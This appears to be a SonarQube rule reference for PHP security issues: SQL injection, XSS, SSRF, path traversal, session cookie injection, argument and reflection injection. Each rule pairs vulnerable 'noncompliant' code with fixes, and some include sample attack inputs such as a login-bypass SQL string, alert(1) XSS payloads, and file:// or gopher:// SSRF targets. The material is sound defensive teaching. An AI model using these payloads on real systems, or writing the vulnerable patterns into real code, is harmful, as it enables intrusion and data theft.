              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br /> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul><li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">our article on this topic</a> </li></ul>  </li></ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo&#39; OR 1&#61;1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
class AuthenticationHandler {

    public mysqli $conn;

    function authenticate() {
        $user &#61; $_POST[&#39;user&#39;];
        $pass &#61; $_POST[&#39;pass&#39;];
        $authenticated &#61; false;

        $query &#61; &#34;SELECT * FROM users WHERE user &#61; &#39;&#34; . $user . &#34;&#39; AND pass &#61; &#39;&#34; . $pass . &#34;&#39;&#34;;

        $stmt &#61; $this-&gt;conn-&gt;query($query); // Noncompliant

        if ($stmt-&gt;num_rows &#61;&#61; 1) {
          $authenticated &#61; true;
        }

        return $authenticated;
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
class AuthenticationHandler {

    public mysqli $conn;

    function authenticate() {
        $user &#61; $_POST[&#39;user&#39;];
        $pass &#61; $_POST[&#39;pass&#39;];
        $authenticated &#61; false;

        $query &#61; &#34;SELECT * FROM users WHERE user &#61; :user AND pass &#61; :pass&#34;;

        $stmt &#61; $this-&gt;conn-&gt;prepare($query);
        $stmt-&gt;bind_param(&#34;:user&#34;, $user);
        $stmt-&gt;bind_param(&#34;:pass&#34;, $pass);
        $stmt-&gt;execute();

        $stmt-&gt;store_result();

        if ( $stmt-&gt;num_rows &#61;&#61; 1) {
          $authenticated &#61; true;
        }

        return $authenticated;
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br /> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user &#61; ? AND pass &#61; ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol &#39;?&#39; was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br /> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br /> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">SonarSource, Exploiting Hibernate Injections</a> </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ" rel="nofollow">CERT, IDS00-J.</a> - Prevent SQL injection </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5131">
              phpsecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br /> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>
<p>User input embedded in HTML code should be HTML-encoded to prevent the injection of additional code. PHP provides the built-in function
<code>htmlspecialchars</code> to do this.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
echo &#39;&lt;h1&gt;&#39; . $input . &#39;&lt;/h1&gt;&#39;;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
echo &#39;&lt;h1&gt;&#39; . htmlspecialchars($input) . &#39;&lt;/h1&gt;&#39;;
</pre>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response with the
content-type header.</p>
<p>For example, setting the content-type to <code>text/plain</code> using the built-in <code>header</code> function allows to safely reflect user
input since browsers will not try to parse and execute the response.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="2" data-diff-type="noncompliant">
echo $input;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="2" data-diff-type="compliant">
header(&#39;Content-Type: text/plain&#39;);
echo $input;
</pre>
<h3>How does this work?</h3>
<h4>Encode data according to the HTML context</h4>
<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact
from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific
encoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>
ContextCode exampleExploit exampleEncoding <p>Inbetween tags</p> <pre>
&lt;!doctype html&gt;
&lt;div&gt;
  { data }
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  &lt;script&gt;
    alert(1)
  &lt;/script&gt;
&lt;/div&gt;
</pre> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>
        <ul><li> &amp; → &amp;amp; </li><li> &lt; → &amp;lt; </li><li> &gt; → &amp;gt; </li><li> &#34; → &amp;quot; </li><li> &#39; → &amp;#x27; </li></ul>  <p>In an attribute surrounded with single or double quotes</p> <pre>
&lt;!doctype html&gt;
&lt;div tag&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div tag&#61;&#34;&#34;
     onmouseover&#61;&#34;alert(1)&#34;&gt;
  ...
&lt;/div&gt;
</pre> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>
        <ul><li> &amp; → &amp;amp; </li><li> &lt; → &amp;lt; </li><li> &gt; → &amp;gt; </li><li> &#34; → &amp;quot; </li><li> &#39; → &amp;#x27; </li></ul>  <p>In an unquoted attribute</p> <pre>
&lt;!doctype html&gt;
&lt;div tag&#61;{ data }&gt;
  ...
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div tag&#61;foo
     onmouseover&#61;alert(1)&gt;
  ...
&lt;/div&gt;
</pre> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p>  <p>In a URL attribute</p> <pre>
&lt;!doctype html&gt;
&lt;a href&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/a&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;a href&#61;&#34;javascript:alert(1)&#34;&gt;
  ...
&lt;/a&gt;
</pre> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>
      as a scheme.</p>  <p>In a script block</p> <pre>
&lt;!doctype html&gt;
&lt;script&gt;
  { data }
&lt;/script&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  alert(1)
&lt;/script&gt;
</pre> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>
&lt;!doctype html&gt;
&lt;script data&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/script&gt;
</pre>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br /> The following content-types are known to be affected:</p>
<ul><li> application/mathml&#43;xml </li><li> application/rdf&#43;xml </li><li> application/vnd.wap.xhtml&#43;xml </li><li> application/xhtml&#43;xml </li><li> application/xml </li><li> image/svg&#43;xml </li><li> multipart/x-mixed-replace </li><li> text/html </li><li> text/rdf </li><li> text/xml </li><li> text/xsl </li></ul>
<h4>Single quoted variables in attributes</h4>
<p>By default, <code>htmlspecialchars</code> does not encode single quotes, so if <code>$input</code> is untrusted, JavaScript code can be
injected.</p>
<p>Make sure to set the option <code>ENT_QUOTES</code> to encode single quotes.</p>
<h5>Noncompliant code example</h5>
<pre data-diff-id="3" data-diff-type="noncompliant">
echo &#34;&lt;img src&#61;&#39;&#34; . htmlspecialchars($input) . &#34;&#39;&gt;&#34;;
</pre>
<h5>Compliant solution</h5>
<pre data-diff-id="3" data-diff-type="compliant">
echo &#34;&lt;img src&#61;&#39;&#34; . htmlspecialchars($input, ENT_QUOTES) . &#34;&#39;&gt;&#34;;
</pre>
<h4>Headers and output</h4>
<p>If the HTTP body is sent before <code>header</code> is called, no headers will be sent to the client.</p>
<p>To fix this issue, send the headers before any output.</p>
<h5>Noncompliant code example</h5>
<pre data-diff-id="4" data-diff-type="noncompliant">
echo &#39;No more headers at this point&#39;;
header(&#39;Content-Type: text/plain&#39;);
echo $input;
</pre>
<h5>Compliant solution</h5>
<pre data-diff-id="4" data-diff-type="compliant">
header(&#39;Content-Type: text/plain&#39;);
echo $input;
</pre>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br /> <a href="https://web.dev/csp-xss/" rel="nofollow">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability" rel="nofollow">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li><li> <a href="https://blog.sonarsource.com/ghost-admin-takeover" rel="nofollow">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li><li> <a href="https://samy.pl/myspace/" rel="nofollow">Samy Kamkar, The MySpace Worm</a> </li></ul>
<h3>Conference presentations</h3>
<ul><li> <a href="https://www.youtube.com/watch?v&#61;ksq7e6UUDag" rel="nofollow">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79.html" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5144">
              phpsecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br /></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br /> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br /> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$host &#61; $_GET[&#39;host&#39;];
$url &#61; &#34;https://$host/.well-known/openid-configuration&#34;;

$ch &#61; curl_init($url); // Noncompliant
curl_exec($ch);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$allowedHosts &#61; [&#34;trusted1&#34; &#61;&gt; &#34;trusted1.example.com&#34;, &#34;trusted2&#34; &#61;&gt; &#34;trusted2.example.com&#34;];
$host &#61; $allowedHosts[$_GET[&#39;host&#39;]];
$url &#61; &#34;https://$host/.well-known/openid-configuration&#34;;

$ch &#61; curl_init($url);
curl_exec($ch);
</pre>
<h3>How does this work?</h3>
<p>The application should avoid opening URLs that are constructed with untrusted data.</p>
<p>When such a feature is strictly necessary, SSRF can be mitigated by applying an allow-list of trustable schemes and domains.</p>
<p>The compliant code example uses such an approach.</p>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" rel="nofollow">OWASP Top 10 2021 Category A10</a> - Server-Side Request
  Forgery (SSRF) </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/918" rel="nofollow">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2083">
              phpsecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$fileName &#61; $_GET[&#34;filename&#34;];

file_get_contents($fileName); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$fileName &#61; $_GET[&#34;filename&#34;];
$targetDirectory &#61; &#34;/path/to/target/directory/&#34;;

$path &#61; realpath($targetDirectory . $fileName);

if (str_starts_with($path,  $targetDirectory)) {
    file_get_contents($path);
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li><li> Resolve the canonical path of the file by using methods like <code>&#96;realPath&#96;</code>. This will resolve relative path or path components like
  <code>../</code> and removes any ambiguity regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li></ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol><li> <code>data &#61; transform(user_input);</code> </li><li> <code>data &#61; normalize(data);</code> </li><li> <code>data &#61; sanitize(data);</code> </li><li> <code>use(data);</code> </li></ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v&#61;V-DdcKADnFk" rel="nofollow">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S6287">
              phpsecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a href="https://example.com?cookie&#61;injectedcookie" rel="nofollow">https://example.com?cookie&#61;injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br /> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function checkCookie()
{
    if (!isset($_COOKIE[&#39;PHPSESSID&#39;])) {
        $value &#61; $_GET[&#39;cookie&#39;];
        setcookie(&#39;PHPSESSID&#39;, $value); // Noncompliant
    }

    header(&#39;Location: /welcome.php&#39;);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function checkCookie()
{
    if (!isset($_COOKIE[&#39;PHPSESSID&#39;])) {
        header(&#39;Location: /getcookie.php&#39;);
    }

    header(&#39;Location: /welcome.php&#39;);
}
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br /> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S6350">
              phpsecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-9920" rel="nofollow">CVE-2016-9920</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2021-29472" rel="nofollow">CVE-2021-29472</a> </li></ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Malicious arguments can result in undesired behavior in the executed command. </li><li> Passing user input to a system command is not necessary. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid constructing system commands from user input when possible. </li><li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li><li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li></ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
$input &#61; $_GET[&#39;input&#39;];
system(&#39;/usr/bin/find &#39; . escapeshellarg($input)); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
$input &#61; $_GET[&#39;input&#39;];
if (in_array($input, $allowed, true)) {
  system(&#39;/usr/bin/find &#39; . escapeshellarg($input));
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer" rel="nofollow">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S6173">
              phpsecurity:S6173
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to
inspect, load or invoke a component by name.</p>
<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code
execution on the server’s website.</p>
<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the
initial reflection logic to an impactful malicious one.</p>
<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected
code to run. The attacker can use this ability to run arbitrary code on the server.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>
<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted
actions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>
